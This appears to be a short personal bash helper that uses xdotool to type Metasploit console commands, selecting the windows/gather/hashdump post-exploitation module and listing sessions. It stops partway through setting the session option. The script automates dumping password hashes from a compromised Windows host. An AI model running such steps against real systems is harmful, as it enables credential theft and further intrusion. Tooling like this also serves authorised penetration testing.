#!/bin/bash

: '
meterpreter: set windows post hash dump
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "use windows/gather/hashdump"
xdotool key Return
sleep 1

paste_command "sessions"
xdotool key Return
sleep 1

paste_command "set -g SESSION "

